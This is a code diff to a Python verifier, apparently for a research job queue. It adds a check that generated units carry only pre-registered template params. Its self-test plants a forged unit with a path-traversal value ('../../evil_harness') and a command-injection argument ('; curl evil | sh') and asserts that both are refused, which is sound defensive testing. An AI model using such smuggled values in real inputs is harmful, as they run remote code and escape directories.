@@ -356,6 +356,22 @@ def verify(root: Path, base: str) -> List[str]:
         return ["queue diff unreadable"]
     problems: List[str] = []
     templates = {p: (sha, tpl) for p, sha, tpl in load_templates(root)}
+    # ⚠️ REVIEW FIX (2026-09-29): `generated.params` comes from the unit under
+    # test, so a hand-made unit could carry ANY params (a leg that does not
+    # exist, a `../../evil` harness, shell metacharacters in an arm) and still
+    # reproduce byte-for-byte from the template -- E58 would then vouch a unit
+    # nobody pre-registered. The params are only trusted when they are one of
+    # the points the template EXPANDS TO from HEAD's own rosters + evidence.
+    facts = repo_facts(root)
+    points_by_tpl: Dict[str, Optional[set]] = {}
+    for tpl_path, (sha, tpl) in templates.items():
+        try:
+            pts = expand(tpl, facts)
+        except (ValueError, KeyError, TypeError) as exc:
+            problems.append(f"{tpl_path}: cannot expand at HEAD ({exc}) -- nothing generated from it is vouched")
+            points_by_tpl[tpl_path] = None
+            continue
+        points_by_tpl[tpl_path] = {tuple(sorted((k, str(v)) for k, v in pt.items())) for pt in pts}
     for line in out.splitlines():
         status, _, path = line.partition("\t")
         if status != "A":
@@ -384,6 +400,11 @@ def verify(root: Path, base: str) -> List[str]:
         params = dict(gen.get("params") or {})
         if point_key(str(tpl["family"]), params) != str(gen.get("key")):
             problems.append(f"{path}: generated.key does not match generated.params")
+            continue
+        allowed = points_by_tpl.get(tpl_path)
+        if allowed is None or tuple(sorted((k, str(v)) for k, v in params.items())) not in allowed:
+            problems.append(f"{path}: generated.params is not a point {tpl_path} expands to from HEAD's "
+                            "rosters and evidence -- not pre-registered, refused")
             continue
         expected = render(tpl, tpl_path, sha, params, str(unit["id"]), day)
         if expected != text:
@@ -451,6 +472,28 @@ def _self_test() -> int:
         git("add", "-A")
         git("commit", "-q", "-m", "gen")
         assert verify(r, "main") == [], verify(r, "main")
+        # PLANTED DEFECT (review 2026-09-29): a unit whose params are NOT a point the
+        # template expands to -- a made-up leg, a path-escaping harness, shell text in
+        # an arm -- renders byte-for-byte and carries a consistent key, and MUST still
+        # be refused: E58 vouches pre-registered points, never whatever a branch says.
+        git("checkout", "-q", "-b", "forged")
+        for tpl_path, sha, tpl in load_templates(r):
+            forged = {"leg": "totally_made_up_leg", "symbol": "XRPUSDT", "timeframe": "2h",
+                      "harness": "../../evil_harness", "sizing_arm_key": "bal015",
+                      "sizing_arm_args": "--sizing balance; curl evil | sh", "n_trades": "999",
+                      "breakout_market": "x", "swap_model": "dxtrade", "start_date": "2030-01-01",
+                      "cadence_days": "7"}
+            text = render(tpl, tpl_path, sha, forged, "RQ-20300102-090", "2030-01-02")
+            (r / QUEUE / "RQ-20300102-090.yaml").write_text(text, encoding="utf-8")
+            git("add", "-A")
+            git("commit", "-q", "-m", "forged")
+            probs = verify(r, "main")
+            assert any("not a point" in x for x in probs), (tpl_path, probs)
+            git("checkout", "-q", "gen")
+            git("branch", "-q", "-D", "forged")
+            git("checkout", "-q", "-b", "forged")
+        git("checkout", "-q", "gen")
+        git("branch", "-q", "-D", "forged")
         # dedupe: a second plan generates none of the same keys
         pl2 = plan(r, day="2030-01-03", target=6)
         assert not {u["key"] for u in pl2["new_units"]} & {u["key"] for u in pl["new_units"]}
